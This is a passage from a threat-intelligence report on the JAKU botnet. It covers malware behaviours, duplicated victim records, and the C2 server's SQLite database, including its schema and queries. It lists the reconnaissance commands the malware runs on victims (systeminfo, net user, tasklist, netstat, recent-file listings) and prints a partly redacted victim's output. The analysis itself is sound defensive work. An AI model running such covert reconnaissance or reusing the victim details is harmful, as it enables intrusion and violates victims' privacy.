Underhill made, where he renames the file 780 times (30 *\n26) instead of the intended 30. The only difference is that the file truncation is only performed once in the\nmalware, rather than 10 times, as in Underhill's code. The purpose of this code is to prevent advanced\nforensics techniques from being able to recover the deleted files.\n\n**Unfinished Code. The 'du' and 'dlu' commands are interesting because they only support unloading a module**\nfrom the current process, but by creating a remote thread in a new explorer.exe. This makes little sense\nbecause it would be a lot simpler and more effective to just unload the module in the current process. This is\nlikely to be an unfinished or abandoned routine that is currently not used by the actor. The older version of this\nmalware that Kaspersky analysed did not have any implementation for 'dlu', and the 'dll' routine did not create\na new thread in an explorer.exe process to do this work, but instead did it from its own process.\n\n**Spoofed File Dates. When a file is sent to the infected machine via the \"_put\" command and written to disk,**\nthe file access times are modified to be the same as gdi32.dll's from the system directory. This makes the file\nless suspicious and can also prevent some forensic time-lining.\n\n**Under Development. The older version of this malware that Kaspersky analysed was compiled using**\nMicrosoft Visual Studio 6.0, whereas this version has been compiled with Microsoft Visual Studio 10.0. The\nmalware is clearly being actively developed and the developers' environment(s) are being improved.\n\n3 http://udt.sourceforge.net/\n4 http://www.codeproject.com/Articles/30453/Secure-File-Shredder\n\n**TLP-WHITE** |  34\n\n\n-----\n\n# WHO IS SAPHARUS?\n\nSAPHARUS-PC is the name of a Windows computer which appears over 1,800 times in one of the JAKU\nDatasets (referred to as the SAPHARUS data set for this reason). From a research point of view, this\nsignificant anomaly clearly needed investigation.\n\n**SAPHARUS Timeline.** The number of entries is the database is constantly changing. While the total number\nof entries appears to grow, due to more victims being infected, the number of SAPHARUS entries is\ndecreasing:\n\n**DATE** **VICTIM COUNT** **SAPHARUS-PC COUNT**\n\n2015-10-04 5765 1912\n2015-10-26 5974 1869\n2015-11-15 6160 1854\n2015-12-10 6188 1831\n\n**The Real SAPHARUS.** Within the dataset there appear one is 'real' SAPHARUS-PC (UID: D1336E59-0FB3473B-8A43-F667E7052CF5) with a public IP address of 91.44.233.77. This is expected to be a 'real' host\nbecause of the system information is complete and is not duplicated elsewhere. Whereas, the SAPHARUS-PC\nduplicates all have identical system information.\n\n**Hypothesis #1 - Overwrites.** Real entries were overwritten in error with the SAPHARUS data. A number of\nfacts support this hypotheses: the fake SAPAHRUS data is clearly corrupted and is missing the task list and\nrecent files, part of which could have resulted in some sort of parsing error or when dumping it in the DB. The\nASN's and IP's of these entries seem to indicate that they are real victims. However, it is impossible to prove\nthat it wasn't done intentionally. (Likelihood: High)\n\n**Hypothesis #2 - Additions.** SAPHARUS entries were added either due to an error or intentionally. This\nseems less likely as SAPHARUS-PC entries reuse some of the IPs already in the database. Furthermore,\nadding SAPHARUS entries intentionally would serve very little purpose.\n\nThere is evidence that at least one SAPHARUS-PC is bogus:\n\n**SAPHARUS at Forcepoint.** One of the hosts with the name SAPHARUS-PC has an external IP address\nrecorded in the dataset, which is in reality an IP address owned and operated by Forcepoint. During the\nanalysis of JAKU, the Forcepoint Special Investigation team operated a honeypot machine which had an\nexternal IP address identical to the SAPHARUS-PC public IP address.\n\n**Diversity of Addresses.** The SAPHARUS-PC external IP addresses are from a large and diverse number of\nASNs. These IP addresses and ASNs appear to correlate with the ASNs of other victims.\n\n**Truncated System Information. SAPHARUS-PC entries have truncated system information (INFO); i.e. no**\ntask list and no recent files.\n\nIt is believed that the SAPHARUS-PC entries are duplicated information from other victim data. Why this is the\ncase is unclear. Possibilities include programming errors in the C2 software (possible), or the use of\nSAPHARUS-PC as a 'flag' while administering the C2 data sets (unlikely).\n\nFor analysis purposes, the SAPHARUS-PC entries were not included in detailed analysis such as correlation\nof victims within and across C2 servers.\n\n**TLP-WHITE** |  35\n\n|DATE VICTIM COUNT SAPHARUS-PC COUNT|Col2|Col3|\n|---|---|---|\n|2015-10-04|5765|1912|\n|2015-10-26|5974|1869|\n|2015-11-15|6160|1854|\n|2015-12-10|6188|1831|\n\n\n-----\n\n# C2 TELEMETRY DATABASES\n\n**SQLite Databases. All JAKU C2 servers identified have viewable directories via the local web server. From a**\nweb browser, it is possible to view the content of a directory named /img:\n```\n                             Index of /img \n Icon  Name          Last modified   Size Description\n____________________________________________________________________________________________________________________________\n [DIR] Parent Directory \n [IMG] near.jpg        09-Dec-2015 19:59 451M\n____________________________________________________________________________________________________________________________\n  Apache/2.2.21 (Unix) DAV/2 mod_ssl/2.2.21 OpenSSL/1.0.0c PHP/5.3.8 mod_apreq2-20090110/2.7.1 mod_perl/2.0.5 \n  Perl/v5.10.1 Server at pic3.mooo.com Port 80\n\n```\n**Near.jpg. The file called near.jpg** is not an image file. When examined, the file is found to be a SQLite2\nformat database:\n```\n$ file near.jpg\nnear.jpg: SQLite 2.x database\n\n```\nThis database contains details of the malware/botnet victim hosts. It details the network information, dates and\ntimes the malware first 'called home', the last call-home time, the last updated time and a history of the\nmalware beaconing to the C2 server:\n```\n$ sqlite near.jpg .schema\nCREATE TABLE child (uid TEXT PRIMARY KEY, version REAL, pip TEXT, info TEXT, infouptime INTEGER,\niplist TEXT, instime INTEGER,lasttime INTEGER, downfile TEXT, downver REAL);\nCREATE TABLE dist2 (id INTEGER PRIMARY KEY, pubdownfile TEXT, pubdownver REAL, pubdowncnt INTEGER,\npridownfile TEXT, pridownver REAL, pridowncnt INTEGER);\nCREATE TABLE history (id INTEGER PRIMARY KEY, uid TEXT, ctime INTEGER);\nCREATE TABLE tvdist (id INTEGER PRIMARY KEY, tvdownfile TEXT, tvdownver REAL, tvdowncnt INTEGER);\nCREATE INDEX idx_instime ON child(instime);\nCREATE INDEX idx_lasttime ON child(lasttime);\nCREATE INDEX idx_version ON child(version);\n\n```\n**TLP-WHITE** |  36\n\n\n-----\n\n**HISTORY Table. The history table contains a list of all beacons set by the malware on the victim machine to**\nthe C2 server:\n\n**COLUMN** **DESCRIPTION**\n\nUID A unique identifier of the victim. This matches the UID in the CHILD table\n\nThe data/time of a beacon made from the victim machine to the C2 server. As with all the data/times in the SQLite\nCTIME\ndatabase, the format is in \"UNIX Epoch\" format.\n\nExample query of HISTORY table:\n```\n$ sqlite -column -header near.jpg \"SELECT * FROM HISTORY LIMIT 5;\"\nid     uid                   ctime   \n---------- -------------------------------------- ---------1      {610313D3-6359-4543-8314-64E1DF6DBF20} 1430186473\n2      {610313D3-6359-4543-8314-64E1DF6DBF20} 1430188242\n3      {12941DFB-6ECD-45CD-B7B2-9C0F8F16DF6F} 1430359648\n4      {66CEAD40-85D9-4AA8-9B59-3DF9E079FA69} 1430443896\n5      {211E31DB-C944-4C66-A91C-7C7BDF7CE5EF} 1430447441\n$ sqlite -column -header near.jpg 'SELECT STRFTIME(\"%Y-%m-%d %H:%M:%S\",CTIME,\"UNIXEPOCH\") AS\n\"DATE/TIME\" FROM HISTORY WHERE UID=\"{211E31DB-C944-4C66-A91C-7C7BDF7CE5EF}\"\nDATE/TIME     \n------------------2015-05-01 02:30:41\n2015-05-01 06:30:34\n2015-05-01 07:04:07\n2015-05-01 07:30:34\n2015-05-01 08:30:35\n2015-05-01 09:00:35\n2015-05-01 09:30:35\n2015-05-01 10:00:35\n2015-05-01 10:31:55\n2015-05-01 11:01:16\n2015-05-01 11:30:36\n2015-05-01 12:00:35\n2015-05-01 12:30:34\n2015-05-01 13:00:39\n2015-05-01 13:30:34\n2015-05-01 14:00:35\n2015-05-01 14:30:34\n2015-05-04 13:30:40\n2015-05-04 14:00:39\n2015-05-04 14:30:39\n2015-05-04 15:00:38\n\n```\n**TLP-WHITE** |  37\n\n|COLUMN DESCRIPTION|Col2|\n|---|---|\n|UID|A unique identifier of the victim. This matches the UID in the CHILD table|\n|CTIME|The data/time of a beacon made from the victim machine to the C2 server. As with all the data/times in the SQLite database, the format is in \"UNIX Epoch\" format.|\n\n\n-----\n\n**CHILD Table. Analysis has shown that the table CHILD is information that relates to victim hosts:**\n\n**COLUMN** **DESCRIPTION**\n\nA unique identifier of the victim. This allows the C2 server to track victims if and when their IP address\nUID\nchanges.\n\nVERSION Believed to be the version of the malware on the victim machine.\n\nThe public IP address of the victim. This is updated as and when the victim machines external IP\nPIP\naddress changes.\n\nINFO The details gathered by the malware from the victim machine (See below).\n\nThe date/time that the INFO field was updated in the database. Believed to be the date/time on the C2\nINFOUPTIME\nserver.\n\nIPLIST A list of IP addresses from all the victim machines network interfaces.\n\nINSTIME The date/time that the malware was originally installed on the victim machine.\n\nLASTTIME The date/time of the last beacon received by the C2 server from the malware on the victim machine.\n\nDOWNFILE Unknown. Never observed populated.\n\nDOWNVER Unknown. Never observed populated.\n\n**INFO Column Commands. The INFO column contains output from the execution of the following commands:**\n```\nsysteminfo\nnet use\nnet user\ntasklist /svc\nnetstat -ano\ndir \"%USERPROFILE%\\Recent\"\ndir \"%APPDATA%\\Microsoft\\Windows\\Recent\"\ndir /s/b \"%USERPROFILE%\\Favorites\"\n\n```\n**TLP-WHITE** |  38\n\n|HILD Table. Analysis has shown that the table CHILD is information that relates to victim hosts:|Col2|\n|---|---|\n|COLUMN DESCRIPTION||\n|UID|A unique identifier of the victim. This allows the C2 server to track victims if and when their IP address changes.|\n|VERSION|Believed to be the version of the malware on the victim machine.|\n|PIP|The public IP address of the victim. This is updated as and when the victim machines external IP address changes.|\n|INFO|The details gathered by the malware from the victim machine (See below).|\n|INFOUPTIME|The date/time that the INFO field was updated in the database. Believed to be the date/time on the C2 server.|\n|IPLIST|A list of IP addresses from all the victim machines network interfaces.|\n|INSTIME|The date/time that the malware was originally installed on the victim machine.|\n|LASTTIME|The date/time of the last beacon received by the C2 server from the malware on the victim machine.|\n|DOWNFILE|Unknown. Never observed populated.|\n|DOWNVER|Unknown. Never observed populated.|\n\n\n-----\n\nExample query of CHILD table:\n```\n$ sqlite -list near.jpg \"SELECT * FROM CHILD WHERE UID = '{211E31DB-C944-4C66-A91C-7C7BDF7CE5EF}';\"\n{211E31DB-C944-4C66-A91C-7C7BDF7CE5EF}|12|***.***.***.***|\n<<systeminfo>>\nHost Name:         *********-PC\nOS Name:          Microsoft Windows 7 Ultimate \nOS Version:        6.1.7600 N/A Build 7600\nOS Manufacturer:      Microsoft Corporation\nOS Configuration:     Standalone Workstation\nOS Build Type:       Multiprocessor Free\nRegistered Owner:     *********\nRegistered Organization:  \nProduct ID:        00426-292-0000007-85307\nOriginal Install Date:   12/24/2014, 2:53:55 PM\nSystem Boot Time:     5/1/2015, 9:00:02 AM\nSystem Manufacturer:    Hewlett-Packard\nSystem Model:       HP EliteBook 8530p\nSystem Type:        X86-based PC\nProcessor(s):       1 Processor(s) Installed.\n              [01]: x64 Family 6 Model 23 Stepping 10 GenuineIntel ~2801 Mhz\nBIOS Version:       Hewlett-Packard 68PDV Ver. F.11, 12/8/2009\nWindows Directory:     C:\\Windows\nSystem Directory:     C:\\Windows\\system32\nBoot Device:        \\Device\\HarddiskVolume1\nSystem Locale:       en-us;English (United States)\nInput Locale:       en-us;English (United States)\nTime Zone:         (UTC+05:00) Islamabad, Karachi\nTotal Physical Memory:   1,978 MB\nAvailable Physical Memory: 970 MB\nVirtual Memory: Max Size: 3,957 MB\nVirtual Memory: Available: 2,406 MB\nVirtual Memory: In Use:  1,551 MB\nPage File Location(s):   C:\\pagefile.sys\nDomain:          WORKGROUP\nLogon Server:       \\\\*********-PC\nHotfix(s):         N/A\nNetwork Card(s):      2 NIC(s) Installed.\n              [01]: Intel(R) 82567LM Gigabit Network Connection\n                 Connection Name: Local Area Connection\n                 DHCP Enabled:  Yes\n                 DHCP Server:   192.168.1.1\n                 IP address(es)\n                 [01]: 192.168.1.7\n                 [02]: fe80::ad52:568:3375:927b\n              [02]: Intel(R) WiFi Link 5300 AGN\n                 Connection Name: Wireless Network Connection\n                 Status:     Media disconnected\n<<net use>>\nNew connections will be remembered.\nThere are no entries in the list.\n<<net user>>\nUser accounts for \\\\*********-PC\n------------------------------------------------------------------------------*********        Administrator      Guest          \nThe command completed successfully.\n<<tasklist /svc>>\n\n```\n**TLP-WHITE** |  39\n\n\n-----\n\n```\nImage Name           PID Services                  \n========================= ======== ============================================\nSystem Idle Process       0 N/A                     \nSystem              4 N/A                     \nsmss.exe            232 N/A                     \ncsrss.exe           324 N/A                     \nwininit.exe          400 N/A                     \ncsrss.exe           412 N/A                     \nwinlogon.exe          456 N/A                     \nservices.exe          500 N/A                     \nlsass.exe           516 KeyIso, SamSs                \nlsm.exe            524 N/A                     \nsvchost.exe          636 DcomLaunch, PlugPlay, Power         \nsvchost.exe          708 RpcEptMapper, RpcSs             \nsvchost.exe          780 Audiosrv, Dhcp, eventlog, lmhosts, wscsvc  \nsvchost.exe          852 AudioEndpointBuilder, CscService, Netman,  \n                  PcaSvc, SysMain, TrkWks, UxSms,       \n                  WdiSystemHost, Wlansvc, wudfsvc       \nsvchost.exe          896 AeLookupSvc, BITS, Browser, EapHost, gpsvc, \n                  IKEEXT, iphlpsvc, LanmanServer, MMCSS,   \n                  ProfSvc, Schedule, SENS, ShellHWDetection, \n                  Themes, Winmgmt, wuauserv          \naudiodg.exe          992 N/A                     \nsvchost.exe          1052 EventSystem, netprofm, nsi, sppuinotify,  \n                  WdiServiceHost               \n…\nchrome.exe          3644 N/A                     \nchrome.exe          4028 N/A                     \nchrome.exe          2248 N/A                     \nsvchost.exe          2560 WinDefend                  \nwmpnetwk.exe         3696 WMPNetworkSvc                \ntaskeng.exe          608 N/A                     \nServices.exe         1408 N/A                     \nWmiPrvSE.exe         2176 N/A                     \nWmiPrvSE.exe         3088 N/A                     \nTrustedInstaller.exe     3832 TrustedInstaller              \ncmd.exe            3780 N/A                     \nconhost.exe          3284 N/A                     \ntasklist.exe         2872 N/A                     \n<<netstat -ano>>\nActive Connections\n Proto Local Address     Foreign Address    State      PID\n TCP  0.0.0.0:135      0.0.0.0:0       LISTENING    708\n TCP  0.0.0.0:445      0.0.0.0:0       LISTENING    4\n TCP  0.0.0.0:554      0.0.0.0:0       LISTENING    3696\n TCP  0.0.0.0:49158     0.0.0.0:0       LISTENING    516\n TCP  192.168.1.7:139    0.0.0.0:0       LISTENING    4\n TCP  192.168.1.7:49162   64.233.167.188:5228  ESTABLISHED   3416\n TCP  [::]:135        [::]:0         LISTENING    708\n TCP  [::]:445        [::]:0         LISTENING    4\n TCP  [::]:554        [::]:0         LISTENING    3696\n TCP  [::]:2869       [::]:0         LISTENING    4\n TCP  [::]:10243       [::]:0         LISTENING    4\n TCP  [::]:26143       [::]:0         LISTENING    4\n TCP  [::]:49152       [::]:0         LISTENING    400\n TCP  [::]:49153       [::]:0         LISTENING    780\n TCP  [::]:49154       [::]:0         LISTENING    896\n TCP  [::]:49155       [::]:0         LISTENING    500\n TCP  [::]:49156       [::]:0         LISTENING    952\n\n```\n```\nSystem Idle Process       0 N/A                     \nSystem              4 N/A                     \nsmss.exe            232 N/A                     \ncsrss.exe           324 N/A                     \nwininit.exe          400 N/A                     \ncsrss.exe           412 N/A                     \nwinlogon.exe          456 N/A                     \nservices.exe          500 N/A                     \nlsass.exe           516 KeyIso, SamSs                \nlsm.exe            524 N/A                     \nsvchost.exe          636 DcomLaunch, PlugPlay, Power         \nsvchost.exe          708 RpcEptMapper, RpcSs             \nsvchost.exe          780 Audiosrv, Dhcp, eventlog, lmhosts, wscsvc  \nsvchost.exe          852 AudioEndpointBuilder, CscService, Netman,  \n                  PcaSvc, SysMain, TrkWks, UxSms,       \n                  WdiSystemHost, Wlansvc, wudfsvc       \nsvchost.exe          896 AeLookupSvc, BITS, Browser, EapHost, gpsvc, \n                  IKEEXT, iphlpsvc, LanmanServer, MMCSS,   \n                  ProfSvc, Schedule, SENS, ShellHWDetection, \n                  Themes, Winmgmt, wuauserv          \naudiodg.exe          992 N/A                     \nsvchost.exe          1052 EventSystem, netprofm, nsi, sppuinotify,  \n                  WdiServiceHost               \n\n```\n\n**TLP-WHITE** |  40\n\n\n-----\n\n```\n TCP  [::]:49157       [::]:0         LISTENING    1436\n TCP  [::]:49158       [::]:0         LISTENING    516\n…\n UDP  0.0.0.0:500      *:*                  896\n UDP  0.0.0.0:4500      *:*                  896\n UDP  [::]:500        *:*                  896\n UDP  [::]:4500       *:*                  896\n UDP  [::]:5004       *:*                  3696\n UDP  [::]:5005       *:*                  3696\n UDP  [::]:5355       *:*                  1156\n UDP  [::1]:1900       *:*                  3440\n UDP  [::1]:49778      *:*                  3440\n UDP  [fe80::ad52:568:3375:927b%11]:546 *:*            780\n UDP  [fe80::ad52:568:3375:927b%11]:1900 *:*            3440\n UDP  [fe80::ad52:568:3375:927b%11]:49777 *:*           3440\n<<dir \"%USERPROFILE%\\Recent\">>\n Volume in drive C has no label.\n Volume Serial Number is 887D-B326\n Directory of C:\\Users\\***\\Recent\nFile Not Found\n<<dir \"%APPDATA%\\Microsoft\\Windows\\Recent\">>\n Volume in drive C has no label.\n Volume Serial Number is 887D-B326\n Directory of C:\\Users\\***\\AppData\\Roaming\\Microsoft\\Windows\\Recent\n04/27/2015 12:29 AM  <DIR>     .\n04/27/2015 12:29 AM  <DIR>     ..\n04/26/2015 09:51 PM        601 00.lnk\n04/01/2015 10:37 PM        687 100 WATT INVERTER.lnk\n04/01/2015 10:36 PM        682 100 WATT INVETER.lnk\n04/19/2015 01:20 PM        595 20140423_204028.lnk\n12/27/2014 03:13 PM        325 28.lnk\n04/26/2015 09:51 PM        625 90 pic.lnk\n04/26/2015 09:51 PM        606 900.lnk\n04/10/2015 06:24 PM        695 A-COURSE OUTLINE(ISL.STU).lnk\n04/26/2015 09:52 PM        606 ali.lnk\n04/26/2015 09:52 PM        613 ali0.lnk\n04/27/2015 12:28 AM        156 All Control Panel Items.lnk\n04/08/2015 01:00 AM        156 Appearance and Personalization.lnk\n03/20/2015 05:20 PM  <DIR>     AutomaticDestinations\n01/01/2015 08:49 PM        616 bahria (2).lnk\n12/24/2014 05:36 PM        722 bahria.lnk\n04/19/2015 01:20 PM        425 bhai mob pic.lnk\n03/08/2015 07:25 PM       2,672 Bluetooth.lnk\n01/01/2015 08:34 PM        321 CD_ROM (G).lnk\n04/19/2015 09:38 PM       3,811 Chrysanthemum.lnk\n12/24/2014 04:16 PM        704 company profile.lnk\n04/10/2015 06:24 PM        456 course outline 2015 IQRA.lnk\n05/01/2015 09:05 AM  <DIR>     CustomDestinations\n04/15/2015 12:05 AM       3,734 Desert.lnk\n04/15/2015 12:46 AM        575 download.lnk\n…\n12/24/2014 05:04 PM        702 ELECTRIC BILL RECORD.lnk\n01/30/2015 07:05 PM        652 eReport *********.lnk\n04/01/2015 10:33 PM        702 Faster Fingure First.lnk\n04/27/2015 12:29 AM        156 Hardware and Sound.lnk\n04/19/2015 09:44 PM       3,823 Hydrangeas.lnk\n01/07/2015 01:55 PM        702 Item by part no. NEW.lnk\n12/24/2014 04:16 PM        533 KU.lnk\n03/08/2015 07:46 PM       3,378 Media.lnk\n\n```\n```\n04/27/2015 12:29 AM  <DIR>     .\n04/27/2015 12:29 AM  <DIR>     ..\n04/26/2015 09:51 PM        601 00.lnk\n04/01/2015 10:37 PM        687 100 WATT INVERTER.lnk\n04/01/2015 10:36 PM        682 100 WATT INVETER.lnk\n04/19/2015 01:20 PM        595 20140423_204028.lnk\n12/27/2014 03:13 PM        325 28.lnk\n04/26/2015 09:51 PM        625 90 pic.lnk\n04/26/2015 09:51 PM        606 900.lnk\n04/10/2015 06:24 PM        695 A-COURSE OUTLINE(ISL.STU).lnk\n04/26/2015 09:52 PM        606 ali.lnk\n04/26/2015 09:52 PM        613 ali0.lnk\n04/27/2015 12:28 AM        156 All Control Panel Items.lnk\n04/08/2015 01:00 AM        156 Appearance and Personalization.lnk\n03/20/2015 05:20 PM  <DIR>     AutomaticDestinations\n01/01/2015 08:49 PM        616 bahria (2).lnk\n12/24/2014 05:36 PM        722 bahria.lnk\n04/19/2015 01:20 PM        425 bhai mob pic.lnk\n03/08/2015 07:25 PM       2,672 Bluetooth.lnk\n01/01/2015 08:34 PM        321 CD_ROM (G).lnk\n04/19/2015 09:38 PM       3,811 Chrysanthemum.lnk\n12/24/2014 04:16 PM        704 company profile.lnk\n04/10/2015 06:24 PM        456 course outline 2015 IQRA.lnk\n05/01/2015 09:05 AM  <DIR>     CustomDestinations\n04/15/2015 12:05 AM       3,734 Desert.lnk\n04/15/2015 12:46 AM        575 download.lnk\n\n```\n\n**TLP-WHITE** |  41\n\n\n-----\n\n```\n01/29/2015 03:02 PM        587 multan 042.lnk\n04/18/2015 12:26 AM        156 Network and Internet.lnk\n03/30/2015 12:06 PM        592 Outlook.com.lnk\n12/27/2014 03:13 PM        222 OVI (G).lnk\n03/08/2015 07:25 PM       1,926 Phone.lnk\n01/01/2015 09:10 PM        417 PICNIC PIC.lnk\n03/20/2015 05:20 PM        594 Pictures.lnk\n04/08/2015 09:20 PM        156 Programs.lnk\n03/30/2015 12:06 PM        541 qt.lnk\n04/19/2015 09:44 PM       2,031 Sample Pictures.lnk\n03/08/2015 07:09 PM        515 scaning docs.lnk\n01/09/2015 11:55 AM       2,562 Scanned Documents.lnk\n04/11/2015 07:08 PM        409 TIPU PIC.lnk\n03/20/2015 05:20 PM       1,555 Untitled.lnk\n04/25/2015 07:30 PM        515 VIDEO_TS.lnk\n01/01/2015 08:34 PM        460 VLC PLAYER 2011.lnk\n02/01/2015 12:15 AM        674 VTS_01_0.lnk\n04/19/2015 01:12 PM        674 VTS_01_5.lnk\n04/01/2015 10:33 PM        672 waqas inverter.lnk\n03/08/2015 07:46 PM       4,172 WhatsApp Images.lnk\n       55 File(s)     53,597 bytes\n        4 Dir(s) 38,160,457,728 bytes free\n…\n|1430447441|192.168.1.8|1430447441|1430751638||\n\n```\n\n**TLP-WHITE** |  42\n\n\n-----\n\n# PARTING THOUGHTS FOR THE READER\n\n### AN EXERCISE TO THE READER\n\nDuring the JAKU investigation, a great deal of data was collected, collated and analysed. Some of the data\nthrows greater insight on the JAKU campaign, while much of it, sadly, does not. Occasionally, when ‘pivoting’\noff already collected data, strange and unusual things are found; for example, learning that Shokushu is\nJapanese for tentacle.\n\nUnfortunately, time is sometimes not available to allow for the “so what?” questions to be answered fully. One\nexample is the following script which was found at the URL: hxxp://bestshop.minidns.net/test/ccdown/ping.bat.\nAlthough dating back to November 2014, it is still noteworthy because of a number of curiosity reasons. One\nexample is: “Why ‘ping’ **after doing the ‘traceroute’?”**\n\nThe remaining reasons are left as an exercise to the reader. However, this is not the Easter-egg you are\nlooking for:\n```\ntracert fs.star.kp >> %tmp%\\temp98746.tmp\nping fs.star.kp >> %tmp%\\temp98746.tmp\ntracert 172.16.1.18 >> %tmp%\\temp98746.tmp\nping 172.16.0.38 >> %tmp%\\temp98746.tmp\nping 172.16.0.37 >> %tmp%\\temp98746.tmp\nping 172.16.4.1 >> %tmp%\\temp98746.tmp\nping 10.10.1.1 >> %tmp%\\temp98746.tmp\nping 1.0.128.2 >> %tmp%\\temp98746.tmp\n\n### WHY JAKU?\n\n```\n_“The most merciful thing in the world, I think, is the inability of the human mind to correlate all its contents.”_\n\n_(Lovecraft, The Call of Cthulhu, 1926)_\n\nDuring the course of our investigation we have been often asked “Why JAKU?”\n\nInitially, it was a misspelt reference to the desert planet in the Star Wars movie The Force Awakens. This was\nbecause we had discovered a number of Star Wars references made by the threat actors within their malware.\nThis included R2D2. Because we had no wish to face any copyright issues, we spelt it as JAKU.\n\nHowever, as we embarked on our investigation we found out more about JAKU. We realised that this thing\nhad reached every corner of the world. As we continued, it began to emerge that this beast had a centre of\ngravity somewhere in the Gulf of Thailand and a predilection for attacking Japan and South Korea.\n\nAs an unashamed fan Japanese monster movies, anime, manga and DJ Krush, and with more than a passing\ninterest in Lovecraft’s Cthulhu mythos, it was clear (to me at least) that JAKU should be represented as a\ntentacle wielding sea monster rising from ocean to grab its next set of victims. This fitted well with our\nobservation of the noticeable amount of pirated anime movies on the victim machines, downloaded from sites\n‘baited’ with malware to catch the next unsuspecting victims.\n\n_Andy Settle Head of Special Investigations, Forcepoint Security Labs_\n\n**TLP-WHITE** |  43\n\n\n-----\n\n# REFERENCES\n\n  - Coding and Security, Glorious Leader's Not-ThatGlorious Malwares - Part 2 (Jan 2015), Available\n[from: <https://www.codeandsec.com/Glorious-](https://www.codeandsec.com/Glorious-Leaders-Not-That-Glorious-Malwares-Part-2)\n[Leaders-Not-That-Glorious-Malwares-Part-2>. [Dec](https://www.codeandsec.com/Glorious-Leaders-Not-That-Glorious-Malwares-Part-2)\n2015]\n\n  - Schneier Bruce, DarkHotel (Nov 2014), Available\nfrom:\n[<https://www.schneier.com/blog/archives/2014/11/so](https://www.schneier.com/blog/archives/2014/11/sophisticated_t.html)\nphisticated_t.html>. [Sep 2015].\n\n  - CNET, 'Darkhotel' hack targets executives using hotel\nInternet (Nov 2014), Available from:\n[<http://www.cnet.com/news/darkhotel-hack-targets-](http://www.cnet.com/news/darkhotel-hack-targets-executives-using-hotel-internet/)\nexecutives-using-hotel-internet/>. [Oct 2015].\n\n  - FBI, Malware Installed on Travelers' Laptops Through\nSoftware Updates on Hotel Internet Connections (Nov\n2014), Available from:\n[<http://www.ic3.gov/media/2012/120508.aspx>, [Oct](http://www.ic3.gov/media/2012/120508.aspx)\n2015].\n\n  - Fluke Networks, DarkHotel: What Hospitality WLAN\nOperators Should Know (Nov 2014), Available from:\n[<http://www.flukenetworks.com/blog/airwise/darkhotel](http://www.flukenetworks.com/blog/airwise/darkhotel-what-hospitality-wlan-operators-should-know)\n[-what-hospitality-wlan-operators-should-know>. [Oct](http://www.flukenetworks.com/blog/airwise/darkhotel-what-hospitality-wlan-operators-should-know)\n2015].\n\n  - IANA Number Resources,\n<https://www.iana.org/numbers>. [April 2015].\n\n  - Kaspersky, Admin Alert: Kaspersky Lab Reported\nTwice as Many Digital Certificates Used to Sign\nMalware in 2014 (Jan 2015), Available from:\n[<http://www.kaspersky.com/about/news/virus/2015/A](http://www.kaspersky.com/about/news/virus/2015/Admin-Alert-Kaspersky-Lab-Reported-Twice-as-Many-Digital-Certificates-Used-to-Sign-Malware-in-2014)\n[dmin-Alert-Kaspersky-Lab-Reported-Twice-as-Many-](http://www.kaspersky.com/about/news/virus/2015/Admin-Alert-Kaspersky-Lab-Reported-Twice-as-Many-Digital-Certificates-Used-to-Sign-Malware-in-2014)\n[Digital-Certificates-Used-to-Sign-Malware-in-2014>.](http://www.kaspersky.com/about/news/virus/2015/Admin-Alert-Kaspersky-Lab-Reported-Twice-as-Many-Digital-Certificates-Used-to-Sign-Malware-in-2014)\n\n[Oct 2015].\n\n  - Kaspersky, DarkHotel's attacks in 2015 (Jul 2015),\nAvailable from:\n[<https://securelist.com/blog/research/71713/darkhotel](https://securelist.com/blog/research/71713/darkhotels-attacks-in-2015/)\ns-attacks-in-2015/>. [Oct 2015].\n\n  - Kaspersky, DarkHotel: a spy campaign in luxury\nAsian hotels (Nov 2014), Available from:\n[<https://blog.kaspersky.co.uk/darkhotel-apt/>. [Sep](https://blog.kaspersky.co.uk/darkhotel-apt/)\n2015].\n\n  - Kaspersky, Whitepaper DarkHotel (Nov 21014),\nAvailable from:\n\n\n[<https://securelist.com/files/2014/11/darkhotel_kl_07.](https://securelist.com/files/2014/11/darkhotel_kl_07.11.pdf)\n11.pdf>. [Sep 2015].\n\n- Kaspersky, Who’s Really Spreading through the\nBright Star? (Apr 2015), Available from:\n[<https://securelist.com/blog/68978/whos-really-](https://securelist.com/blog/68978/whos-really-spreading-through-the-bright-star/)\nspreading-through-the-bright-star/>. [Dec 2015].\n\n- Secure File Shredder (Oct 2008), Available from:\n<http://www.codeproject.com/Articles/30453/SecureFile-Shredder>. [April 2016].\n\n- Sophos, What the FBI didn’t tell us about the hotel\nmalware threat | Naked Security (May 2012),\nAvailable from:\n[<https://nakedsecurity.sophos.com/2012/05/10/fbi-](https://nakedsecurity.sophos.com/2012/05/10/fbi-hotel-malware-threat)\nhotel-malware-threat>. [Dec 2015].\n\n- Tamatori fighting an octopus, Available from:\n<https://commons.wikimedia.org/wiki/File:Tamakatzur\na_Tamatori_attacked_by_the_octopus.jpg>, [April\n2016].\n\n- UK CERT, SAWR 044 Extract (Dec 2014), Available\n[from: <https://www.cert.gov.uk/wp-](https://www.cert.gov.uk/wp-content/uploads/2014/12/C-SAWR-044-Extract.pdf)\n[content/uploads/2014/12/C-SAWR-044-Extract.pdf>.](https://www.cert.gov.uk/wp-content/uploads/2014/12/C-SAWR-044-Extract.pdf)\n\n[Dec 2015].\n\n- Unlicensed Software and Cybersecurity Threats\n(January 2015), Available from:\n<http://globalstudy.bsa.org/2013/malware/study_malw\nare_en.pdf>. [April 2015].\n\n- WIRED, DarkHotel: A Sophisticated New Hacking\nAttack Targets High-Profile Hotel Guests (Nov 2014),\nAvailable from:\n[<http://www.wired.com/2014/11/darkhotel-malware>.](http://www.wired.com/2014/11/darkhotel-malware)\n\n[Sep 2015].\n\n- UDT: Breaking the Data Transfer Bottleneck (2011),\n[Available from: <http://udt.sourceforge.net/>. [Dec](http://udt.sourceforge.net/)\n2015].\n\n- LZH - Compression/Decompression using lzh/lzhuff\n(Jan 2015), Available from:\n[<https://github.com/msmiley/lzh/blob/master/src/lzh.c](https://github.com/msmiley/lzh/blob/master/src/lzh.c)\n>. [Oct 2015].\n\n**TLP-WHITE** |  44\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
